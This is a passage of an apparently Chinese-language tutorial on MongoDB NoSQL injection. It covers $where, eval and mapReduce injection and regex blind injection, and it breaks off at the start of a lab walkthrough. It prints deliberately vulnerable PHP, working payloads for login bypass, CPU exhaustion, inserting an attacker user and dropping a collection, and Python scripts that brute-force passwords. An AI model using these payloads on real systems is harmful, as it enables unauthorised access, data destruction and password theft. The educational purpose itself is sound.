+<h4 id="where-操作符"><a href="#where-操作符" class="headerlink" title="$where 操作符"></a><strong>$where 操作符</strong></h4><p>在 MongoDB 中 $where 操作符是可以执行 JavaScript 语句的，在 MongoDB 2.4 之前，通过 $where 操作符使用<code>map-reduce</code>、<code>group</code>命令可以访问到 mongo shell 中的全局函数和属性。</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">?</span>php
+$manager <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+$uname <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+$pwd <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+$<span class="token keyword">function</span> <span class="token operator">=</span> <span class="token string">"function() &#123;if(this.uname == '$uname' &amp;&amp; this.pwd == '$pwd') return &#123;'username': this.uname, 'password': this.pwd&#125;&#125;"</span><span class="token punctuation">;</span>
+$query <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token function">array</span><span class="token punctuation">(</span>
+    <span class="token string">'$where'</span> <span class="token operator">=></span> $<span class="token keyword">function</span>
+<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+$result <span class="token operator">=</span> $manager<span class="token operator">-</span><span class="token operator">></span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token string">'test.users'</span><span class="token punctuation">,</span> $query<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+$count <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span>$result<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>$count<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">foreach</span> <span class="token punctuation">(</span><span class="token parameter">$result <span class="token keyword">as</span> $user</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        $user<span class="token operator">=</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span>$user<span class="token punctuation">;</span>
+        echo <span class="token string">'username: '</span><span class="token punctuation">.</span>$user<span class="token punctuation">[</span><span class="token string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+        echo <span class="token string">'password: '</span><span class="token punctuation">.</span>$user<span class="token punctuation">[</span><span class="token string">'pwd'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    echo <span class="token string">'Not Found'</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+<p>MongoDB 2.4 版本之前，可以访问到 db 属性：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>username<span class="token operator">=</span><span class="token string">'||1) return &#123;'</span>username<span class="token string">': tojson(db.getCollectionNames()), '</span>password<span class="token string">': '</span>hacked'<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//&amp;password=1</span></code></pre>
+
+<p>由此可以扩展出其他的很多类似的 payload。</p>
+<p>MongoDB 2.4 版本之后，无法访问全局属性，NoSQL 中的万能密码 payload (单引号闭合)：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>username<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>password<span class="token operator">=</span>admin<span class="token string">' || '</span><span class="token string">' = '</span></code></pre>
+
+<p>相当于执行：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">$<span class="token keyword">function</span> <span class="token operator">=</span> <span class="token string">"function() &#123;if(this.uname == 'anything' &amp;&amp; this.pwd == 'admin' || '' == '') return &#123;'username': this.uname, 'password': this.pwd&#125;&#125;"</span><span class="token punctuation">;</span></code></pre>
+
+<p>此外还有一个类似于 DOS 攻击的 payload，可以让服务器 CPU 飙升到 100% 持续 5 秒：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>username<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> date <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">do</span><span class="token punctuation">&#123;</span>curDate <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">while</span><span class="token punctuation">(</span>curDate<span class="token operator">-</span>date<span class="token operator">&lt;</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a><strong>eval</strong></h4><p>注意，<code>eval</code>使用方式在 Mongo3.0 之后已经被废弃了，而且在官方页面中也没有 Mongo3.0 版本之前的下载链接了，以下的实例代码未经测试，仅提供给大家一个思路，以下代码引用自</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html">https://www.tr0y.wang/2019/04/21/MongoDB%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html</a></p>
+</blockquote>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">?</span>php
+$manager <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+$uname <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+$pwd <span class="token operator">=</span> $_GET<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+$cmd <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Command</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
+<span class="token string">'eval'</span><span class="token operator">=></span> <span class="token string">"db.users.distinct('uname', &#123;uname: '"</span><span class="token punctuation">.</span>$uname'<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>"
+<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+echo <span class="token string">"db.users.distinct('uname', &#123;uname: '"</span><span class="token punctuation">.</span>$uname'<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>"<span class="token punctuation">;</span>
+$result <span class="token operator">=</span> $manager<span class="token operator">-</span><span class="token operator">></span><span class="token function">executeCommand</span><span class="token punctuation">(</span><span class="token string">'sec_test'</span><span class="token punctuation">,</span> $cmd<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+$result <span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span>$result<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'retval'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+$count <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span>$result<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span>$count<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">foreach</span> <span class="token punctuation">(</span><span class="token parameter">$result <span class="token keyword">as</span> $user</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        $user<span class="token operator">=</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span>$user<span class="token punctuation">;</span>
+        echo <span class="token string">'username: '</span><span class="token punctuation">.</span>$user<span class="token punctuation">[</span><span class="token string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>
+        echo <span class="token string">'password: '</span><span class="token punctuation">.</span>$user<span class="token punctuation">[</span><span class="token string">'pwd'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+    echo <span class="token string">'Not Found'</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token operator">?</span><span class="token operator">></span></code></pre>
+
+<p>往 users 集合插入攻击者用户：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>username<span class="token operator">=</span><span class="token number">1</span><span class="token string">'&#125;);db.users.insert(&#123;"username":"ca01h","password":"1"&#125;);db.users.find(&#123;'</span>username<span class="token string">':'</span><span class="token number">2</span></code></pre>
+
+<p>删掉 users 集合：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>username<span class="token operator">=</span><span class="token number">1</span><span class="token string">'&#125;);db.users.drop();db.users.find(&#123;'</span>username<span class="token string">':'</span><span class="token number">2</span></code></pre>
+
+<h4 id="mapReduce"><a href="#mapReduce" class="headerlink" title="mapReduce"></a><strong>mapReduce</strong></h4><p>MongoDB 中的<code>mapReduce</code>函数有点类似于 MySQL 中的<code>group by</code>操作，下面是一个官方文档的例子，在集合 orders 中查找 status:”A” 的数据，并根据 cust_id 来分组，并计算 amount 的总和：</p>
+<p><img src="C:\Users\Yty\AppData\Roaming\Typora\typora-user-images\image-20211125181551028.png" alt="image-20211125181551028"></p>
+<p><strong>简单的解释一下：</strong></p>
+<p><code>map</code>函数用于分组：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token function">emit</span><span class="token punctuation">(</span>param1<span class="token punctuation">,</span> param2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>
+param1：需要分组的字段，<span class="token keyword">this</span><span class="token punctuation">.</span>字段名；
+param2：需要进行统计的字段，<span class="token keyword">this</span><span class="token punctuation">.</span>字段名。</code></pre>
+
+<p><code>reduce</code>函数用于处理需要统计的字段：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">reduce</span><span class="token punctuation">(</span><span class="token parameter">key<span class="token punctuation">,</span> values</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// 统计字段处理 &#125;</span>
+  
+key： 指分组字段（emit的param1）对应的值；
+values：指需要统计的字段（emit的param2）值组成的数组。</code></pre>
+
+<p>Map 函数和 Reduce 函数可以使用 JavaScript 来实现，使得 MapReduce 的使用非常灵活和强大。但是同样也带来了隐患，假设有这样的一个业务场景，数据库中存储了一个<code>store</code>集合，有一系列商品的名称、价格和数量，我们想得到相同商品的价格或者数量的总和，代码如下：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">require_once __DIR__ <span class="token punctuation">.</span> <span class="token string">"/vendor/autoload.php"</span><span class="token punctuation">;</span>
+$param <span class="token operator">=</span> $_POST<span class="token punctuation">[</span><span class="token string">'param'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+$collection <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MongoDB<span class="token punctuation">\</span>Client</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span>test<span class="token operator">-</span><span class="token operator">></span>stores<span class="token punctuation">;</span>
+$map <span class="token operator">=</span> "<span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>items<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token function">emit</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>items<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>$param<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>"<span class="token punctuation">;</span>
+$reduce <span class="token operator">=</span> <span class="token string">"function(name, sum) &#123; return Array.sum(sum); &#125;"</span><span class="token punctuation">;</span>
+$opt <span class="token operator">=</span> <span class="token string">"&#123; out: 'totals' &#125;"</span><span class="token punctuation">;</span>
+$results <span class="token operator">=</span> $collection<span class="token operator">-</span><span class="token operator">></span><span class="token function">mapReduce</span><span class="token punctuation">(</span>$map<span class="token punctuation">,</span> $reduce<span class="token punctuation">,</span> $out<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+
+<p>该代码应该在<code>$param</code>给定的字段上求和，但是这同样给了攻击者可乘之机，如果<code>$param</code>是这样：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">kv</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> out<span class="token operator">:</span> ‘x’ <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+db<span class="token punctuation">.</span>injection<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>success<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+db<span class="token punctuation">.</span>stores<span class="token punctuation">.</span><span class="token function">mapReduce</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#123;</span> <span class="token function">emit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span></code></pre>
+
+<p>那么在 MongoDB 中就相当于执行了下面这条语句：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript">db<span class="token punctuation">.</span>stores<span class="token punctuation">.</span><span class="token function">mapReduce</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>items<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+<span class="token function">emit</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>items<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+<span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">kv</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> out<span class="token operator">:</span> <span class="token string">'x'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+db<span class="token punctuation">.</span>injection<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>success<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+db<span class="token punctuation">.</span>stores<span class="token punctuation">.</span><span class="token function">mapReduce</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#123;</span> <span class="token function">emit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+<span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> sum</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+<span class="token keyword">return</span> Array<span class="token punctuation">.</span><span class="token function">sum</span><span class="token punctuation">(</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> out<span class="token operator">:</span> <span class="token string">'totals'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>"</code></pre>
+
+<p>相当于直接控制了整个 MongoDB 的操作。</p>
+<p>但我们也同时发现，构建这样的 payload 是有一定难度的，需要我们对 MongoDB，JavaScript 和业务都有足够的了解，这也是 NoSQL 注入的局限性。但是，这个例子也告诉我们有用户输入的地方就有危险存在，比如后面有一个 CTF 题目，用的也是 MongoDB 中的聚合函数<code>aggregate</code>，因为一个 GET 参数而存在注入漏洞。</p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a><strong>盲注</strong></h3><p>回想一想上面的例子，假如页面只是告诉你成功或者失败，那么就是我们在 MySQL 里遇到的布尔盲注了。布尔盲注重点在于怎么逐个提取字符，MySQL 里我们可以采用<code>substr</code>，而在 MongoDB 里我们有 <code>$regex</code>正则表达式。下面是一些常用的盲注。</p>
+<p>已知某一个用户名的前提下判断的密码长度：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">?</span>username<span class="token punctuation">[</span>$eq<span class="token punctuation">]</span><span class="token operator">=</span>ca01h<span class="token operator">&amp;</span>password<span class="token punctuation">[</span>$regex<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">.</span><span class="token punctuation">&#123;</span><span class="token number">5</span><span class="token punctuation">&#125;</span></code></pre>
+
+<p>逐位提取字符：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"># url格式
+<span class="token operator">?</span>username<span class="token punctuation">[</span>$eq<span class="token punctuation">]</span><span class="token operator">=</span>ca01h<span class="token operator">&amp;</span>password<span class="token punctuation">[</span>$regex<span class="token punctuation">]</span><span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token punctuation">&#123;</span><span class="token number">4</span><span class="token punctuation">&#125;</span>
+<span class="token operator">?</span>username<span class="token punctuation">[</span>$eq<span class="token punctuation">]</span><span class="token operator">=</span>ca01h<span class="token operator">&amp;</span>password<span class="token punctuation">[</span>$regex<span class="token punctuation">]</span><span class="token operator">=</span>ca<span class="token punctuation">.</span><span class="token punctuation">&#123;</span><span class="token number">3</span><span class="token punctuation">&#125;</span>
+<span class="token operator">?</span>username<span class="token punctuation">[</span>$eq<span class="token punctuation">]</span><span class="token operator">=</span>ca01h<span class="token operator">&amp;</span>password<span class="token punctuation">[</span>$regex<span class="token punctuation">]</span><span class="token operator">=</span>ca0<span class="token punctuation">.</span><span class="token punctuation">&#123;</span><span class="token number">2</span><span class="token punctuation">&#125;</span>
+<span class="token operator">?</span>username<span class="token punctuation">[</span>$eq<span class="token punctuation">]</span><span class="token operator">=</span>ca01h<span class="token operator">&amp;</span>password<span class="token punctuation">[</span>$regex<span class="token punctuation">]</span><span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token operator">*</span>
+<span class="token operator">?</span>username<span class="token punctuation">[</span>$eq<span class="token punctuation">]</span><span class="token operator">=</span>ca01h<span class="token operator">&amp;</span>password<span class="token punctuation">[</span>$regex<span class="token punctuation">]</span><span class="token operator">=</span>ca<span class="token punctuation">.</span><span class="token operator">*</span>
+# json格式
+<span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"$eq"</span><span class="token operator">:</span> <span class="token string">"ca01h"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"$regex"</span><span class="token operator">:</span> <span class="token string">"^c"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"$eq"</span><span class="token operator">:</span> <span class="token string">"ca01h"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"$regex"</span><span class="token operator">:</span> <span class="token string">"^ca"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"$eq"</span><span class="token operator">:</span> <span class="token string">"ca01h"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string">"$regex"</span><span class="token operator">:</span> <span class="token string">"^ca0"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>
+
+<p>当然，提到盲注肯定少不了脚本：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> urllib3
+<span class="token keyword">import</span> string
+<span class="token keyword">import</span> urllib
+urllib3<span class="token punctuation">.</span><span class="token function">disable_warnings</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+username <span class="token operator">=</span> <span class="token string">'admin'</span>
+password <span class="token operator">=</span> <span class="token string">''</span>
+target <span class="token operator">=</span> <span class="token string">'http://127.0.0.1/mongo/test.php'</span>
+<span class="token keyword">while</span> True<span class="token operator">:</span>
+    <span class="token keyword">for</span> c <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token operator">:</span>
+        <span class="token keyword">if</span> c not <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token string">'#'</span><span class="token punctuation">,</span> <span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'$'</span><span class="token punctuation">]</span><span class="token operator">:</span>
+            payload <span class="token operator">=</span> <span class="token string">'?username=%s&amp;password[$regex]=^%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> password <span class="token operator">+</span> c<span class="token punctuation">)</span>
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>target <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">'OK'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token operator">:</span>
+                <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Found one more char : %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>password<span class="token operator">+</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span>
+                password <span class="token operator">+=</span> c</code></pre>
+
+<p>爆破密码结果如下：</p>
+<p><img src="C:\Users\Yty\AppData\Roaming\Typora\typora-user-images\image-20211125181638789.png" alt="image-20211125181638789"></p>
+<p>类似的还有 POST 的版本：</p>
+<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> urllib3
+<span class="token keyword">import</span> string
+<span class="token keyword">import</span> urllib
+urllib3<span class="token punctuation">.</span><span class="token function">disable_warnings</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+username<span class="token operator">=</span><span class="token string">"admin"</span>
+password<span class="token operator">=</span><span class="token string">""</span>
+target <span class="token operator">=</span> <span class="token string">'http://127.0.0.1/mongo/test.php'</span>
+headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'content-type'</span><span class="token operator">:</span> <span class="token string">'application/json'</span><span class="token punctuation">&#125;</span>
+<span class="token keyword">while</span> True<span class="token operator">:</span>
+    <span class="token keyword">for</span> c <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token operator">:</span>
+        <span class="token keyword">if</span> c not <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'*'</span><span class="token punctuation">,</span><span class="token string">'+'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">'?'</span><span class="token punctuation">,</span><span class="token string">'|'</span><span class="token punctuation">]</span><span class="token operator">:</span>
+            payload <span class="token operator">=</span> <span class="token string">'&#123;"username": &#123;"$eq": "%s"&#125;, "password": &#123;"$regex": "^%s" &#125;&#125;'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>username<span class="token punctuation">,</span> password <span class="token operator">+</span> c<span class="token punctuation">)</span>
+            r <span class="token operator">=</span> requests<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> data <span class="token operator">=</span> payload<span class="token punctuation">,</span> headers <span class="token operator">=</span> headers<span class="token punctuation">,</span> verify <span class="token operator">=</span> False<span class="token punctuation">,</span> allow_redirects <span class="token operator">=</span> False<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token string">'OK'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text or r<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">302</span><span class="token operator">:</span>
+                <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"Found one more char : %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>password<span class="token operator">+</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span>
+                password <span class="token operator">+=</span> c</code></pre>
+
+<p>当然这里的脚本还是有一些改进的地方，比如可以首先判断用户名或密码长度，而且上面代码去掉了一些特殊字符等等的。这里就不再多做演示了，刚好下面有一个实例靶机是需要写 Python 脚本盲注 MongoDB，那个代码考虑的问题更多，可以稍微看一下。</p>
+<h1 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h1><p>找到一个nosql靶场，墨者提供的mongodb靶场</p>
+<p><code>(https://www.mozhe.cn/bug/detail/84)</code></p>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">require_once</span> <span class="token string single-quoted-string">'config. php'</span> <span class="token punctuation">;</span>
+<span class="token variable">$db</span><span class="token operator">=</span><span class="token variable">$mongo</span><span class="token operator">-></span><span class="token property">mozhe_cms_Authority</span><span class="token punctuation">;</span>
+<span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"var data=db.notice.findOne(&#123;'id':'<span class="token interpolation"><span class="token variable">$id</span></span>'&#125;); return data;"</span><span class="token punctuation">;</span>
